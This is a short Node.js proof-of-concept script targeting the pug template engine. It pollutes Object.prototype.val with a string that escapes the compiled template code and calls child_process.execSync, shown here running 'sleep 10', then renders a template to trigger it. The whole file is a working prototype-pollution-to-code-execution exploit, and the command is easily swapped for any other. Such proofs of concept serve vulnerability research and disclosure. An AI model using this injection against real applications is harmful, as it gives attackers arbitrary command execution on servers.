pug = require("pug")

Object.prototype.val = '"somevalue", false)); process.mainModule.require("child_process").execSync(\`sleep 10\`);//'

const path = require('path');
const templatePath = path.join(__dirname+"/views/", 'attrs.pug');
const template = pug.compileFile(templatePath);

template({});